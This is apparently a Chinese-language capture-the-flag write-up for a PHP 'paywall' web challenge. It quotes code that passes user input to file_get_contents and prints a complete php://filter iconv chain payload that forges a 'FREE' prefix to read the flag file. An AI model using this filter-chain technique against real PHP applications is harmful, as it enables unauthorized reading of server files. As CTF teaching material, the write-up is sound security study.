# 题目信息

Cefu#2122

Check out this local news paper I built using PHP! You'll need to pay in order to view the good stuff though :)

http://paywall.chal.idek.team:1337/

# 解决方案

这里的关键是利用php伪协议，关键代码如下：

```php
$article_content = file_get_contents($_GET['p'], 1);
```

我们要读flag文件的内容，但是flag文件的内容是PREMIUM开头的，我们要想办法绕过，服务器检测逻辑如下：

```php
            if (strpos($article_content, 'PREMIUM') === 0) {
                die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions
            }
            else if (strpos($article_content, 'FREE') === 0) {
                echo "<article>$article_content</article>";
                die();
            }
            else {
                die('nothing here');
            }
```

已知服务器php版本是8.0，查该版本的文档，发现可以利用的伪协议有string.rot13、string.toupper、string.tolower、convert.base64-encode、convert.base64-decode等，刚开始想通过各种转换拼出FREE，然后查看就可以查看内容，然后再逆向还原，但是尝试了半天，转不出FREE开头的字符串，后面看到别人分享的资料，才知道如何通过PHP伪协议构造出任意想要的字符串，参考链接如下：

- [博文](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
- [源码](https://github.com/synacktiv/php_filter_chain_generator)

最后构造出的payload如下：

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag

```

直接拿到flag：

```
idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}
```